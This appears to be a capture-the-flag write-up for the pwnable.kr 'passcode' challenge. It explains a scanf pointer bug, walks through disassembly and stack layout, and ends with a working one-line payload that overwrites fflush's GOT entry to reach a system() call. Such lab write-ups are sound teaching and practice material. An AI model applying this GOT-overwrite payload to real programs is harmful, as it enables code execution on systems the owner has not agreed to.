# pwnable.kr: passcode

Notes:

- Binary has no PIE, partial RELRO.

`passcode.c` does `scanf` on the int values incorrectly:

```
printf("enter passcode1 : ");
scanf("%d", passcode1);
...
printf("enter passcode2 : ");
scanf("%d", passcode2);
```

x86:

```
0x0804857c <+24>:	mov    edx,DWORD PTR [ebp-0x10]
0x0804857f <+27>:	mov    DWORD PTR [esp+0x4],edx
0x08048583 <+31>:	mov    DWORD PTR [esp],eax
0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>

...

0x080485aa <+70>:	mov    edx,DWORD PTR [ebp-0xc]
0x080485ad <+73>:	mov    DWORD PTR [esp+0x4],edx
0x080485b1 <+77>:	mov    DWORD PTR [esp],eax
0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
```

So basically, the first `scanf` writes to the address stored in `[ebp-16]`. And the second one writes to the address stored in `[ebp-12]`. We have control over these inside `welcome`.

Inside welcome, we can write 100 bytes starting at `[ebp-112]`.

Stack movement:

```
main:
  0x08048665 <+0>:	push   ebp
  0x08048666 <+1>:	mov    ebp,esp
  0x08048668 <+3>:	and    esp,0xfffffff0
  0x0804866b <+6>:	sub    esp,0x10
  ...
  0x0804867a <+21>:	call   0x8048609 <welcome>
  0x0804867f <+26>:	call   0x8048564 <login>
  ...

welcome:
  0x08048609 <+0>:	push   ebp
  0x0804860a <+1>:	mov    ebp,esp
  0x0804860c <+3>:	sub    esp,0x88
  ...
  0x0804862a <+33>:	mov    eax,0x80487dd
  0x0804862f <+38>:	lea    edx,[ebp-0x70]
  0x08048632 <+41>:	mov    DWORD PTR [esp+0x4],edx
  0x08048636 <+45>:	mov    DWORD PTR [esp],eax
  0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
  ...

login:
  0x08048564 <+0>:	push   ebp
  0x08048565 <+1>:	mov    ebp,esp
  0x08048567 <+3>:	sub    esp,0x28
  ...
  0x08048577 <+19>:	mov    eax,0x8048783
  0x0804857c <+24>:	mov    edx,DWORD PTR [ebp-0x10]
  0x0804857f <+27>:	mov    DWORD PTR [esp+0x4],edx
  0x08048583 <+31>:	mov    DWORD PTR [esp],eax
  0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
  ...
  0x080485a5 <+65>:	mov    eax,0x8048783
  0x080485aa <+70>:	mov    edx,DWORD PTR [ebp-0xc]
  0x080485ad <+73>:	mov    DWORD PTR [esp+0x4],edx
  0x080485b1 <+77>:	mov    DWORD PTR [esp],eax
  0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
  ...
```


Exploit

- Write `'A'*96 + p32(FFLUSH_GOT)`
- Then write `0x080485d7` as an int (the address in binary that calls `system(...)`)

- Final payload: `./passcode <<< $(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'A'*96 + struct.pack('<I', 0x804a004) + str(0x080485d7).encode())")`
